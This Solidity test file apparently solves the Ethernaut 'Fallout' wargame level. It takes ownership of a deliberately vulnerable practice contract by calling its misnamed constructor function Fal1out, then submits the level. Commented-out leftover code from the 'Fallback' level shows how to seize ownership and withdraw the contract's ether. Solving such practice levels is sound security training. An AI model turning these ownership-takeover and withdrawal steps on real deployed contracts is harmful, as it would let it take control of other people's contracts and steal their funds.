pragma solidity ^0.8.19;

import "ds-test/test.sol";
import "../../src/Fallout/FalloutFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/test/utils/vm.sol";

contract FalloutsTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallback() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));
        // get balance of ethernautFallout
        emit log_named_address("Fallout OWner Before Attack", ethernautFallout.owner());
        ethernautFallout.Fal1out{value: 1 wei}();
        emit log_named_address("Fallout OWner After Attack", ethernautFallout.owner());
        // validate owner of ethernautFallout is eoaAddress
        assertEq(ethernautFallout.owner(), eoaAddress);
        // attack
        // contribute 1 wei
        // ethernautFallout.contribute{value: 1 wei}();
        // assertEq(ethernautFallout.contributions(eoaAddress), 1 wei);
        // send 1 wei to the contract without calling any function
        // (bool milady,) = payable(address(ethernautFallout)).call{value: 1 wei}("");
        // require(milady);
        // // verify contract owner has been updated to calling/EOA address
        // assertEq(ethernautFallout.owner(), eoaAddress);
        // // withdraw from contract
        // uint256 eoaBAl = eoaAddress.balance;
        // // ethernautFallout.withdraw();
        // // verify EOA balance updated since we recieved the contracts ETH
        // assertGt(eoaAddress.balance, eoaBAl);
        // // verify contract balance is 0
        // assertEq(address(ethernautFallout).balance, 0);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
